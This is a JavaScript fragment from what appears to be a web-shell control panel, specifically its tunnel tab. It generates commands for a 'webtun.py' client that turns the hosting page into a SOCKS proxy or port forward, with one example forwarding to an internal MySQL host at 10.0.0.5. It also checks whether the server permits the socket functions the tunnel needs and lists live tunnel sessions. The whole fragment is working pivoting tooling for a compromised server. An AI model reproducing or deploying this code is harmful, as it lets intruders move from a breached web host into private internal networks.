// ==================== TUNNEL ====================
(function() {
  const urlEl = document.getElementById('tunnel-url');
  const cmdEl = document.getElementById('tunnel-cmd');
  const cmdFwdEl = document.getElementById('tunnel-cmd-fwd');
  if (urlEl) {
    const tunnelUrl = location.origin + location.pathname;
    urlEl.value = tunnelUrl;
    cmdEl.textContent = 'python3 webtun.py -u ' + tunnelUrl + ' -k <password> --socks 1080';
    if (cmdFwdEl) cmdFwdEl.textContent = '# Port forward: python3 webtun.py -u ' + tunnelUrl + ' -k <password> -L 3306:10.0.0.5:3306';
  }
})();

function tunnelRefresh() {
  tunnelCheck();
  tunnelLoadSessions();
}

function tunnelLoadSessions() {
  var el = document.getElementById('tunnel-sessions');
  if (!el) return;
  // Send raw POST with X-WT header (bypasses normal action dispatch, caught by TUNNEL_GUARD)
  fetch(BASE_URL, { method: 'POST', headers: { 'X-WT': 'status' } })
    .then(function(r) { return r.json(); })
    .then(function(d) {
    if (!d.sessions || d.sessions.length === 0) {
      el.innerHTML = '<div style="color:var(--muted);font-size:13px">No active tunnel sessions. Start tunnel from Python client.</div>';
      document.getElementById('tunnel-status').innerHTML = '<span style="color:var(--muted)">Idle</span>';
      return;
    }
    var html = '';
    d.sessions.forEach(function(s) {
      var alive = s.last_active && (Math.floor(Date.now() / 1000) - s.last_active) < 60;
      var color = alive ? 'var(--green)' : (s.status === 'closed' ? 'var(--red)' : 'var(--yellow)');
      var statusText = alive ? 'ACTIVE' : (s.status === 'closed' ? 'CLOSED' : 'STALE');
      var elapsed = Math.floor(Date.now() / 1000) - (s.created_at || 0);
      var stats = s.stats || {};
      html += '<div style="padding:10px;margin-bottom:8px;background:rgba(0,0,0,.2);border-radius:6px;border:1px solid var(--border)">';
      html += '<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px">';
      html += '<span style="color:' + color + ';font-weight:600;font-size:11px;text-transform:uppercase">' + escHtml(statusText) + '</span>';
      html += '<span style="font-family:monospace;font-size:11px;color:var(--muted)">' + escHtml(s.sid) + '</span>';
      html += '<span style="font-size:11px;color:var(--muted)">uptime: ' + elapsed + 's</span>';
      html += '</div>';
      html += '<div style="display:flex;gap:14px;font-size:12px;flex-wrap:wrap">';
      html += '<span>channels: <strong>' + (s.channels || 0) + '</strong></span>';
      html += '<span style="color:var(--green)">in: ' + (stats.bytes_in || 0) + 'B</span>';
      html += '<span style="color:var(--accent)">out: ' + (stats.bytes_out || 0) + 'B</span>';
      html += '<span style="color:var(--muted)">frames: ' + (stats.frames_in || 0) + '/' + (stats.frames_out || 0) + '</span>';
      html += '</div></div>';
    });
    el.innerHTML = html;
    var activeCount = d.sessions.filter(function(s) { return s.status === 'active' && s.last_active && (Math.floor(Date.now() / 1000) - s.last_active) < 60; }).length;
    var statusEl = document.getElementById('tunnel-status');
    if (activeCount > 0) {
      statusEl.innerHTML = '<span style="color:var(--green)">' + activeCount + ' active</span>';
    } else {
      statusEl.innerHTML = '<span style="color:var(--muted)">Idle</span>';
    }
  }).catch(function() {});
}

function tunnelCheck() {
  var resultEl = document.getElementById('tunnel-test-result');
  var reqsEl = document.getElementById('tunnel-reqs');
  var statusEl = document.getElementById('tunnel-status');
  resultEl.innerHTML = '<span class="spinner"></span> Running diagnostics...';

  var fd = new FormData();
  fd.append('action', 'diag');

  fetchJSON(fd)
    .then(function(d) {
      var funcs = d.functions || {};
      var hasSock = funcs['stream_socket_client'];
      var hasSelect = true; // stream_select is always available if stream_socket_client is
      var row = function(label, ok, detail) {
        var badge = ok ? '<span class="badge badge-ok">\u2714</span>' : '<span class="badge badge-no">\u2716</span>';
        return '<div class="diag-item"><span class="diag-label">' + label + '</span><span class="diag-value">' + badge + ' ' + escHtml(String(detail || '')) + '</span></div>';
      };
      var html = '';
      html += row('stream_socket_client', funcs['stream_socket_client'], funcs['stream_socket_client'] ? 'available' : 'disabled');
      html += row('fsockopen', funcs['fsockopen'], funcs['fsockopen'] ? 'available' : 'disabled');
      html += '<div class="diag-item"><span class="diag-label">open_basedir</span><span class="diag-value">' + escHtml(d.open_basedir) + '</span></div>';
      html += '<div class="diag-item"><span class="diag-label">max_execution_time</span><span class="diag-value">' + escHtml(String(d.max_execution_time || 'unknown')) + '</span></div>';
      reqsEl.innerHTML = html;

      if (hasSock) {
        resultEl.innerHTML = '<div style="color:var(--green)">\u2714 Socket functions available. Tunnel should work.</div>';
        if (d.max_execution_time && d.max_execution_time > 0 && d.max_execution_time < 30) {
          resultEl.innerHTML += '<div style="color:var(--yellow);font-size:11px;margin-top:4px">\u26A0 max_execution_time=' + d.max_execution_time + 's is low. Tunnel will auto-reconnect but sessions may be interrupted.</div>';
        }
      } else {
        resultEl.innerHTML = '<div style="color:var(--red)">\u2716 stream_socket_client not available. Tunnel will not work on this host.</div>';
      }

      tunnelLoadSessions();
    })
    .catch(function(err) {
      resultEl.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}
